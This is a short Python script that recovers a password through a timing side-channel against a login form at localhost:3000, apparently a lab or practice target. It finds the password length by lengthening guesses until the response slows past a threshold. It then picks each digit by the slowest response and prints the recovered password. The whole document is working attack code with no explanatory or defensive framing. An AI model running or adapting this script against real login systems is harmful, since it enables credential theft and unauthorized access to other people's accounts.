import requests
import time

url = 'http://localhost:3000/login'
final_password = ''
t_diff = 0
password_payload = ''
username_payload = 'test'
time_for_diff_digit = [0,0,0,0,0,0,0,0,0,0]

print("checking password length")
while(t_diff < 1000):
    password_payload += '1'
    payload =  {
            'username': username_payload, 
            'password': password_payload
           }
    T1 = time.perf_counter()
    r = requests.post(url, data=payload)
    T2 =time.perf_counter()
    t_diff = (T2 - T1)*1000

password_length = len(password_payload)
print("password length is " + str(password_length))

counter = 0
checked_password = ''
while(counter < password_length):
    print("start to check " + str(counter + 1) + "th password")
    for num in range(0,10):
        password_payload = checked_password + str(num) + ('1' * (password_length - len(checked_password) - 1))
        print("    checking password: " + password_payload)
        payload =  {
            'username': username_payload, 
            'password': password_payload
           }
        T1 = time.perf_counter()
        r = requests.post(url, data=payload)
        T2 =time.perf_counter()
        t_diff = (T2 - T1)*1000
        print("    time: " + str(t_diff))
        time_for_diff_digit[num] = t_diff
    max_time = 0
    max_dig = 0
    for num in range(0,10):
        if time_for_diff_digit[num] > max_time:
            max_time = time_for_diff_digit[num]
            max_dig = num
    counter += 1
    print(str(counter) + "th password is " + str(max_dig))
    checked_password += str(max_dig)
print("------------password is "+ checked_password)